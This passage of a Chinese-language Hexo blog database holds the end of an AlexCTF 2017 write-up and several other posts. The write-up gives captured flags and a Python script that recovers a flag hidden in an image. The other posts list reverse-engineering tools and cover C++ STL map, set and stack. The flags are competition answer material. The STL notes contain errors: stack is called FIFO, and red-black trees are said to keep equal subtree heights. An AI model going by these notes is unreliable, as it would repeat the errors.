class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format<span class=\"regexp\">/_flag.extracted/</span>kindle_out$ cat flag.txt </div><div class=\"line\">ALEXCTF&#123;Wh0_N33d5_K1nDl3_t0_3X7R4Ct_K1ND13_F1rMw4R3&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"Scripting\"><a href=\"#Scripting\" class=\"headerlink\" title=\"Scripting\"></a>Scripting</h2><h2 id=\"Script2\"><a href=\"#Script2\" class=\"headerlink\" title=\"Script2\"></a>Script2</h2><p>找到原图。。比较一下，排除噪音，有不同的地方。</p>\n<p><img src=\"/2017/02/07/AlexCTF-writeup/1.png\" alt=\"1.jpg\"></p>\n<p>原图：</p>\n<p><img src=\"/2017/02/07/AlexCTF-writeup/2.png\" alt=\"2.png\"></p>\n<p>下面引用别人的答案：</p>\n<blockquote>\n<p>Some of that is noise. The pixels that look interesting are the 3 rows, where pixels seem to differ at somewhat regular intervals:</p>\n<p>If we print out the x values of these pixels, we get:</p>\n<p>4 17 36 60 68 85 101 120 132 147 165 180 196 214 231 251 260 275 292 305 325 340 357 371 389 415 420 440 452 473 484 500 4 21 37 63 69 83 100 117 132 147 165 178 196 213 229 244 261 275 293 319 324 340 356 383 388 414 421 436 453 479 485 500 4 24 36 53 69 89 103 125</p>\n<p>Or in hex:</p>\n<p>04 11 24 3c 44 55 65 78 84 93 a5 b4 c4 d6 e7 fb 104 113 124 131 145 154 165 173 185 19f 1a4 1b8 1c4 1d9 1e4 1f4 04 15 25 3f 45 53 64 75 84 93 a5 b2 c4 d5 e5 f4 105 113 125 13f 144 154 164 17f 184 19e 1a5 1b4 1c5 1df 1e5 1f4 04 18 24 35 45 59 67 7d</p>\n<p>Note that the leading hex character always increments by 1. However, what happens when we look at just the lower 4 bits of each position in hex?</p>\n<p>414c45584354467b434154535f484944455f534543524554535f444f4e545f544845597d</p>\n<p>That looks like ASCII! It decodes to ALEXCTF{CATS_HIDE_SECRETS_DONT_THEY}.</p>\n</blockquote>\n<p>flag.py</p>\n <figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">import binascii</div><div class=\"line\"><span class=\"built_in\">from</span> PIL import Image</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">new</span> = Image.<span class=\"built_in\">open</span>(<span class=\"string\">'cat_with_secrets.png'</span>).<span class=\"built_in\">load</span>()</div><div class=\"line\">old = Image.<span class=\"built_in\">open</span>(<span class=\"string\">'cat_with_secrets_original.jpg'</span>).<span class=\"built_in\">load</span>()</div><div class=\"line\"></div><div class=\"line\">width = <span class=\"number\">512</span></div><div class=\"line\"></div><div class=\"line\">in_hex = <span class=\"string\">''</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> range(<span class=\"number\">3</span>):</div><div class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(width):</div><div class=\"line\">        <span class=\"keyword\">if</span> (y, x) &lt;= (<span class=\"number\">2</span>, <span class=\"number\">125</span>) <span class=\"keyword\">and</span> <span class=\"built_in\">new</span>[x, y] != old[x, y]:</div><div class=\"line\">            in_hex += <span class=\"string\">'%x'</span> % (x % <span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\">print(binascii.unhexlify(in_hex))</div></pre></td></tr></table></figure>\n<p>当然了简单的方法，<code>pip install steganography</code>，然后run<code>steganography -d cat-with-secrets.png</code></p>\n"},{"title":"Bin选手的武器库","date":"2017-06-08T03:54:42.000Z","_content":"\nBin工具整理，给出描述与使用经验。\n<!--more-->\n\n## ida Pro\n\n反汇编神器。同时还有一份github上的插件[整理](https://github.com/onethawt/idaplugins-list)\n一下列出使用过推荐的一些插件\n\n| Name | Description |\n|:----:|:-----:|\n| Hexray | ida反编译神器，又称f5 |\n| snowman decompiler | F3反编译工具(感觉不是很好用) |\n| HexRayCodeXploer | 自动类型重建及对象浏览 |\n| VMAttack | 主要用来对抗虚拟机与混淆，可提供自动与半自动的分析 |\n| Hexlight | 按B可从一个花括号跳到另一个 |\n\n## Ollydbg\n\nwin平台下使用最广泛ring3动态调试器。\n\n## gdb\n\nlinux平台下调试器，同时有多个增强简脚本供选择。\n\n| Name | Description |\n|:-----------:|:-----------------:|\n| [pwngdb](https://github.com/scwuaptx/Pwngdb) | 专门用来pwn的gdb增强脚本 |\n| [pwndbg](https://github.com/pwndbg/pwndbg)| 个人体验最好的gdb增强脚本 |","source":"_posts/Bin选手的武器库.md","raw":"---\ntitle: Bin选手的武器库\ntags:\n  - weapon\ncategories: []\ndate: 2017-06-08 11:54:42\n---\n\nBin工具整理，给出描述与使用经验。\n<!--more-->\n\n## ida Pro\n\n反汇编神器。同时还有一份github上的插件[整理](https://github.com/onethawt/idaplugins-list)\n一下列出使用过推荐的一些插件\n\n| Name | Description |\n|:----:|:-----:|\n| Hexray | ida反编译神器，又称f5 |\n| snowman decompiler | F3反编译工具(感觉不是很好用) |\n| HexRayCodeXploer | 自动类型重建及对象浏览 |\n| VMAttack | 主要用来对抗虚拟机与混淆，可提供自动与半自动的分析 |\n| Hexlight | 按B可从一个花括号跳到另一个 |\n\n## Ollydbg\n\nwin平台下使用最广泛ring3动态调试器。\n\n## gdb\n\nlinux平台下调试器，同时有多个增强简脚本供选择。\n\n| Name | Description |\n|:-----------:|:-----------------:|\n| [pwngdb](https://github.com/scwuaptx/Pwngdb) | 专门用来pwn的gdb增强脚本 |\n| [pwndbg](https://github.com/pwndbg/pwndbg)| 个人体验最好的gdb增强脚本 |","slug":"Bin选手的武器库","published":1,"updated":"2017-06-28T16:20:24.024Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jy4000shv188bo69d9b","content":"<p>Bin工具整理，给出描述与使用经验。<br><a id=\"more\"></a></p>\n<h2 id=\"ida-Pro\"><a href=\"#ida-Pro\" class=\"headerlink\" title=\"ida Pro\"></a>ida Pro</h2><p>反汇编神器。同时还有一份github上的插件<a href=\"https://github.com/onethawt/idaplugins-list\" target=\"_blank\" rel=\"external\">整理</a><br>一下列出使用过推荐的一些插件</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">Name</th>\n<th style=\"text-align:center\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">Hexray</td>\n<td style=\"text-align:center\">ida反编译神器，又称f5</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">snowman decompiler</td>\n<td style=\"text-align:center\">F3反编译工具(感觉不是很好用)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">HexRayCodeXploer</td>\n<td style=\"text-align:center\">自动类型重建及对象浏览</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">VMAttack</td>\n<td style=\"text-align:center\">主要用来对抗虚拟机与混淆，可提供自动与半自动的分析</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Hexlight</td>\n<td style=\"text-align:center\">按B可从一个花括号跳到另一个</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Ollydbg\"><a href=\"#Ollydbg\" class=\"headerlink\" title=\"Ollydbg\"></a>Ollydbg</h2><p>win平台下使用最广泛ring3动态调试器。</p>\n<h2 id=\"gdb\"><a href=\"#gdb\" class=\"headerlink\" title=\"gdb\"></a>gdb</h2><p>linux平台下调试器，同时有多个增强简脚本供选择。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">Name</th>\n<th style=\"text-align:center\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><a href=\"https://github.com/scwuaptx/Pwngdb\" target=\"_blank\" rel=\"external\">pwngdb</a></td>\n<td style=\"text-align:center\">专门用来pwn的gdb增强脚本</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><a href=\"https://github.com/pwndbg/pwndbg\" target=\"_blank\" rel=\"external\">pwndbg</a></td>\n<td style=\"text-align:center\">个人体验最好的gdb增强脚本</td>\n</tr>\n</tbody>\n</table>\n","excerpt":"<p>Bin工具整理，给出描述与使用经验。<br></p>","more":"<p></p>\n<h2 id=\"ida-Pro\"><a href=\"#ida-Pro\" class=\"headerlink\" title=\"ida Pro\"></a>ida Pro</h2><p>反汇编神器。同时还有一份github上的插件<a href=\"https://github.com/onethawt/idaplugins-list\">整理</a><br>一下列出使用过推荐的一些插件</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">Name</th>\n<th style=\"text-align:center\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">Hexray</td>\n<td style=\"text-align:center\">ida反编译神器，又称f5</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">snowman decompiler</td>\n<td style=\"text-align:center\">F3反编译工具(感觉不是很好用)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">HexRayCodeXploer</td>\n<td style=\"text-align:center\">自动类型重建及对象浏览</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">VMAttack</td>\n<td style=\"text-align:center\">主要用来对抗虚拟机与混淆，可提供自动与半自动的分析</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Hexlight</td>\n<td style=\"text-align:center\">按B可从一个花括号跳到另一个</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Ollydbg\"><a href=\"#Ollydbg\" class=\"headerlink\" title=\"Ollydbg\"></a>Ollydbg</h2><p>win平台下使用最广泛ring3动态调试器。</p>\n<h2 id=\"gdb\"><a href=\"#gdb\" class=\"headerlink\" title=\"gdb\"></a>gdb</h2><p>linux平台下调试器，同时有多个增强简脚本供选择。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">Name</th>\n<th style=\"text-align:center\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><a href=\"https://github.com/scwuaptx/Pwngdb\">pwngdb</a></td>\n<td style=\"text-align:center\">专门用来pwn的gdb增强脚本</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><a href=\"https://github.com/pwndbg/pwndbg\">pwndbg</a></td>\n<td style=\"text-align:center\">个人体验最好的gdb增强脚本</td>\n</tr>\n</tbody>\n</table>"},{"title":"C++ STL Map","date":"2017-02-19T03:36:24.000Z","_content":"\n## map\n\n`map`是STL的一个关联容器，提供`key`到`value`映射，类似`python`里的字典的功能。`map`内自建一棵红黑树，具有对数据自动排序的功能，所以`map`内部的所有数据都是有序的。\n\n`#include<map>`\n`map<key, value> key_to_value`\n\n## 成员函数\n\n|函数|用法|\n|:--:|:--:|\n|begin()|返回指向`map`头部的迭代器|\n|clear()|删除所有元素|\n|count(elem)|返回指定出现的次数|\n|empty()|判断是否空|\n|end()|指向`map`末尾的迭代器|\n|equal_range()|返回特殊条目的迭代器对|\n|erase()|删除一个元素|\n|find()|查找一个元素|\n|get_allocator()|返回`map`的配置器|\n|insert()|插入元素|\n|key_comp()|返回比较元素`key`的函数|\n|lower_bound()|返回键值>=给定元素的第一个位置|\n|max_size()|返回可以容纳的最大元素数|\n|rebign()|返回一个可以指向`map`尾部的逆向迭代器|\n|rend()|返回一个指向`map`头部的逆向迭代器|\n|size()|返回`map`中元素的数目|\n|swap()|交换两个`map`|\n|upper_bound()|返回键值>给定元素的第一个位置|\n|value_comp()|返回比较`value`的函数|","source":"_posts/C-STL-Map.md","raw":"---\ntitle: C++ STL Map\ntags:\n  - STL\ncategories: []\ndate: 2017-02-19 11:36:24\n---\n\n## map\n\n`map`是STL的一个关联容器，提供`key`到`value`映射，类似`python`里的字典的功能。`map`内自建一棵红黑树，具有对数据自动排序的功能，所以`map`内部的所有数据都是有序的。\n\n`#include<map>`\n`map<key, value> key_to_value`\n\n## 成员函数\n\n|函数|用法|\n|:--:|:--:|\n|begin()|返回指向`map`头部的迭代器|\n|clear()|删除所有元素|\n|count(elem)|返回指定出现的次数|\n|empty()|判断是否空|\n|end()|指向`map`末尾的迭代器|\n|equal_range()|返回特殊条目的迭代器对|\n|erase()|删除一个元素|\n|find()|查找一个元素|\n|get_allocator()|返回`map`的配置器|\n|insert()|插入元素|\n|key_comp()|返回比较元素`key`的函数|\n|lower_bound()|返回键值>=给定元素的第一个位置|\n|max_size()|返回可以容纳的最大元素数|\n|rebign()|返回一个可以指向`map`尾部的逆向迭代器|\n|rend()|返回一个指向`map`头部的逆向迭代器|\n|size()|返回`map`中元素的数目|\n|swap()|交换两个`map`|\n|upper_bound()|返回键值>给定元素的第一个位置|\n|value_comp()|返回比较`value`的函数|","slug":"C-STL-Map","published":1,"updated":"2017-02-19T04:24:02.233Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jy6000uhv18jcy3kf7f","content":"<h2 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map\"></a>map</h2><p><code>map</code>是STL的一个关联容器，提供<code>key</code>到<code>value</code>映射，类似<code>python</code>里的字典的功能。<code>map</code>内自建一棵红黑树，具有对数据自动排序的功能，所以<code>map</code>内部的所有数据都是有序的。</p>\n<p><code>#include&lt;map&gt;</code><br><code>map&lt;key, value&gt; key_to_value</code></p>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">begin()</td>\n<td style=\"text-align:center\">返回指向<code>map</code>头部的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">clear()</td>\n<td style=\"text-align:center\">删除所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">count(elem)</td>\n<td style=\"text-align:center\">返回指定出现的次数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">判断是否空</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">end()</td>\n<td style=\"text-align:center\">指向<code>map</code>末尾的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">equal_range()</td>\n<td style=\"text-align:center\">返回特殊条目的迭代器对</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">erase()</td>\n<td style=\"text-align:center\">删除一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">find()</td>\n<td style=\"text-align:center\">查找一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">get_allocator()</td>\n<td style=\"text-align:center\">返回<code>map</code>的配置器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">insert()</td>\n<td style=\"text-align:center\">插入元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">key_comp()</td>\n<td style=\"text-align:center\">返回比较元素<code>key</code>的函数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower_bound()</td>\n<td style=\"text-align:center\">返回键值&gt;=给定元素的第一个位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">max_size()</td>\n<td style=\"text-align:center\">返回可以容纳的最大元素数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rebign()</td>\n<td style=\"text-align:center\">返回一个可以指向<code>map</code>尾部的逆向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rend()</td>\n<td style=\"text-align:center\">返回一个指向<code>map</code>头部的逆向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">返回<code>map</code>中元素的数目</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">swap()</td>\n<td style=\"text-align:center\">交换两个<code>map</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper_bound()</td>\n<td style=\"text-align:center\">返回键值&gt;给定元素的第一个位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">value_comp()</td>\n<td style=\"text-align:center\">返回比较<code>value</code>的函数</td>\n</tr>\n</tbody>\n</table>\n","excerpt":"","more":"<h2 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map\"></a>map</h2><p><code>map</code>是STL的一个关联容器，提供<code>key</code>到<code>value</code>映射，类似<code>python</code>里的字典的功能。<code>map</code>内自建一棵红黑树，具有对数据自动排序的功能，所以<code>map</code>内部的所有数据都是有序的。</p>\n<p><code>#include&lt;map&gt;</code><br><code>map&lt;key, value&gt; key_to_value</code></p>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">begin()</td>\n<td style=\"text-align:center\">返回指向<code>map</code>头部的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">clear()</td>\n<td style=\"text-align:center\">删除所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">count(elem)</td>\n<td style=\"text-align:center\">返回指定出现的次数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">判断是否空</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">end()</td>\n<td style=\"text-align:center\">指向<code>map</code>末尾的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">equal_range()</td>\n<td style=\"text-align:center\">返回特殊条目的迭代器对</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">erase()</td>\n<td style=\"text-align:center\">删除一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">find()</td>\n<td style=\"text-align:center\">查找一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">get_allocator()</td>\n<td style=\"text-align:center\">返回<code>map</code>的配置器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">insert()</td>\n<td style=\"text-align:center\">插入元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">key_comp()</td>\n<td style=\"text-align:center\">返回比较元素<code>key</code>的函数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower_bound()</td>\n<td style=\"text-align:center\">返回键值&gt;=给定元素的第一个位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">max_size()</td>\n<td style=\"text-align:center\">返回可以容纳的最大元素数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rebign()</td>\n<td style=\"text-align:center\">返回一个可以指向<code>map</code>尾部的逆向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rend()</td>\n<td style=\"text-align:center\">返回一个指向<code>map</code>头部的逆向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">返回<code>map</code>中元素的数目</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">swap()</td>\n<td style=\"text-align:center\">交换两个<code>map</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper_bound()</td>\n<td style=\"text-align:center\">返回键值&gt;给定元素的第一个位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">value_comp()</td>\n<td style=\"text-align:center\">返回比较<code>value</code>的函数</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"C++ STL Set","date":"2017-02-18T02:26:39.000Z","_content":"\n## set\n\n`set`集合容器：实现了红黑树的平衡二叉检索树的数据结构，插入元素时，它会自动调整二叉树的排列，把元素放到适当的位置，以保证每个子树根节点键值大于左子树所有节点的键值，小于右子树所有节点的键值；另外，还得保证根节点左子树的高度与右子树高度相等。\n构造set集合主要目的是为了快速检索，**不可**直接去修改键值。\n\n`#include<set>`\n\n## 成员函数\n\n|函数|用法|\n|:------:|:--------:|\n|begin()|返回指向第一个元素的迭代器|\n|clear()|清除所有元素|\n|count()|返回某个值元素的个数，实事上只返回`0`或`1`，不会重复插入|\n|empty()|返回是否空|\n|end()|指向最后一个元素后的一个迭代器，不是最后一个元素|\n|equal_range()|返回集合中与给定值相等的上下限的两个迭代器|\n|erase()|删除集合中的元素|\n|find()|返回被查找元素的迭代器|\n|get_allocator()|返回集合的分配器|\n|insert()|在集合中插入元素|\n|lower_bound()|指向`>=`某值的第一个元素的迭代器|\n|key_comp()|返回一个用于元素间值比较的函数|\n|max_size()|返回集合能容纳的元素的最大限值|\n|rbegin()|返回集合中指向最后一个元素的反向迭代器|\n|rend()|返回集合中指向第一个元素的反向迭代器|\n|size()|集合中元素额数目|\n|swap()|交换两个集合的变量|\n|upper_bound()|返回大于某个值元素的迭代器|\n|value_comp()|返回一个用于比较元素间值的函数|","source":"_posts/C-STL-Set.md","raw":"---\ntitle: C++ STL Set\ntags:\n  - STL\ncategories: []\ndate: 2017-02-18 10:26:39\n---\n\n## set\n\n`set`集合容器：实现了红黑树的平衡二叉检索树的数据结构，插入元素时，它会自动调整二叉树的排列，把元素放到适当的位置，以保证每个子树根节点键值大于左子树所有节点的键值，小于右子树所有节点的键值；另外，还得保证根节点左子树的高度与右子树高度相等。\n构造set集合主要目的是为了快速检索，**不可**直接去修改键值。\n\n`#include<set>`\n\n## 成员函数\n\n|函数|用法|\n|:------:|:--------:|\n|begin()|返回指向第一个元素的迭代器|\n|clear()|清除所有元素|\n|count()|返回某个值元素的个数，实事上只返回`0`或`1`，不会重复插入|\n|empty()|返回是否空|\n|end()|指向最后一个元素后的一个迭代器，不是最后一个元素|\n|equal_range()|返回集合中与给定值相等的上下限的两个迭代器|\n|erase()|删除集合中的元素|\n|find()|返回被查找元素的迭代器|\n|get_allocator()|返回集合的分配器|\n|insert()|在集合中插入元素|\n|lower_bound()|指向`>=`某值的第一个元素的迭代器|\n|key_comp()|返回一个用于元素间值比较的函数|\n|max_size()|返回集合能容纳的元素的最大限值|\n|rbegin()|返回集合中指向最后一个元素的反向迭代器|\n|rend()|返回集合中指向第一个元素的反向迭代器|\n|size()|集合中元素额数目|\n|swap()|交换两个集合的变量|\n|upper_bound()|返回大于某个值元素的迭代器|\n|value_comp()|返回一个用于比较元素间值的函数|","slug":"C-STL-Set","published":1,"updated":"2017-02-18T02:58:34.866Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyb000xhv18vfof5fcv","content":"<h2 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h2><p><code>set</code>集合容器：实现了红黑树的平衡二叉检索树的数据结构，插入元素时，它会自动调整二叉树的排列，把元素放到适当的位置，以保证每个子树根节点键值大于左子树所有节点的键值，小于右子树所有节点的键值；另外，还得保证根节点左子树的高度与右子树高度相等。<br>构造set集合主要目的是为了快速检索，<strong>不可</strong>直接去修改键值。</p>\n<p><code>#include&lt;set&gt;</code></p>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">begin()</td>\n<td style=\"text-align:center\">返回指向第一个元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">clear()</td>\n<td style=\"text-align:center\">清除所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">count()</td>\n<td style=\"text-align:center\">返回某个值元素的个数，实事上只返回<code>0</code>或<code>1</code>，不会重复插入</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">返回是否空</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">end()</td>\n<td style=\"text-align:center\">指向最后一个元素后的一个迭代器，不是最后一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">equal_range()</td>\n<td style=\"text-align:center\">返回集合中与给定值相等的上下限的两个迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">erase()</td>\n<td style=\"text-align:center\">删除集合中的元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">find()</td>\n<td style=\"text-align:center\">返回被查找元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">get_allocator()</td>\n<td style=\"text-align:center\">返回集合的分配器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">insert()</td>\n<td style=\"text-align:center\">在集合中插入元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower_bound()</td>\n<td style=\"text-align:center\">指向<code>&gt;=</code>某值的第一个元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">key_comp()</td>\n<td style=\"text-align:center\">返回一个用于元素间值比较的函数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">max_size()</td>\n<td style=\"text-align:center\">返回集合能容纳的元素的最大限值</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rbegin()</td>\n<td style=\"text-align:center\">返回集合中指向最后一个元素的反向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rend()</td>\n<td style=\"text-align:center\">返回集合中指向第一个元素的反向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">集合中元素额数目</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">swap()</td>\n<td style=\"text-align:center\">交换两个集合的变量</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper_bound()</td>\n<td style=\"text-align:center\">返回大于某个值元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">value_comp()</td>\n<td style=\"text-align:center\">返回一个用于比较元素间值的函数</td>\n</tr>\n</tbody>\n</table>\n","excerpt":"","more":"<h2 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h2><p><code>set</code>集合容器：实现了红黑树的平衡二叉检索树的数据结构，插入元素时，它会自动调整二叉树的排列，把元素放到适当的位置，以保证每个子树根节点键值大于左子树所有节点的键值，小于右子树所有节点的键值；另外，还得保证根节点左子树的高度与右子树高度相等。<br>构造set集合主要目的是为了快速检索，<strong>不可</strong>直接去修改键值。</p>\n<p><code>#include&lt;set&gt;</code></p>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">begin()</td>\n<td style=\"text-align:center\">返回指向第一个元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">clear()</td>\n<td style=\"text-align:center\">清除所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">count()</td>\n<td style=\"text-align:center\">返回某个值元素的个数，实事上只返回<code>0</code>或<code>1</code>，不会重复插入</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">返回是否空</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">end()</td>\n<td style=\"text-align:center\">指向最后一个元素后的一个迭代器，不是最后一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">equal_range()</td>\n<td style=\"text-align:center\">返回集合中与给定值相等的上下限的两个迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">erase()</td>\n<td style=\"text-align:center\">删除集合中的元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">find()</td>\n<td style=\"text-align:center\">返回被查找元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">get_allocator()</td>\n<td style=\"text-align:center\">返回集合的分配器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">insert()</td>\n<td style=\"text-align:center\">在集合中插入元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower_bound()</td>\n<td style=\"text-align:center\">指向<code>&gt;=</code>某值的第一个元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">key_comp()</td>\n<td style=\"text-align:center\">返回一个用于元素间值比较的函数</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">max_size()</td>\n<td style=\"text-align:center\">返回集合能容纳的元素的最大限值</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rbegin()</td>\n<td style=\"text-align:center\">返回集合中指向最后一个元素的反向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">rend()</td>\n<td style=\"text-align:center\">返回集合中指向第一个元素的反向迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">集合中元素额数目</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">swap()</td>\n<td style=\"text-align:center\">交换两个集合的变量</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper_bound()</td>\n<td style=\"text-align:center\">返回大于某个值元素的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">value_comp()</td>\n<td style=\"text-align:center\">返回一个用于比较元素间值的函数</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"C++ STL Stack","date":"2017-02-17T06:53:19.000Z","_content":"\n## Stack\n\n实现了栈的全部功能，(FIFO)数据结构。\n\n`#include<stack>`\n\n## 成员函数\n\n| 函数 | 用法 |\n| :---: | :---: |\n| empty() | 是否为空，空返回true |\n| pop() | 弹栈 |\n| push() | 压栈 |\n| size() | 返回栈元素数目 |\n| top() | 返回栈顶元素 |","source":"_posts/C-STL-Stack.md","raw":"---\ntitle: C++ STL Stack\ntags:\n  - STL\ncategories: []\ndate: 2017-02-17 14:53:19\n---\n\n## Stack\n\n实现了栈的全部功能，(FIFO)数据结构。\n\n`#include<stack>`\n\n## 成员函数\n\n| 函数 | 用法 